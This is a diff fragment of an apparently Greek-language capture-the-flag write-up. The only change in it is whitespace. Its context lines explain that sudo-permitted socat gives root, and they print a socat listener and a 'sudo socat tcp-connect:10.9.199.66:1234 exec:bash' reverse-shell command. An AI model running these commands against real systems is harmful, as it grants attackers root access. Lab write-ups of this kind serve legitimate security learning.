@@ -33,7 +33,7 @@ User falconfeast may run the following commands on inclusion:
 
 Edw vlepoyme oti exoyme to socat ena pio powerfull version toy netcat poy mporoyme na to trexoyme ws root me sudo..
 Anoigoyme ena listener gia na kanoyme revshell: socat file:`tty`,raw,echo=0 tcp-listen:1234
-
+ 
 Kai meta trexoyme ayto: sudo socat tcp-connect:10.9.199.66:1234 exec:bash,pty,stderr,setsid,sigint,sane
 
 Kai exome root gia na paroyme to flag mas..
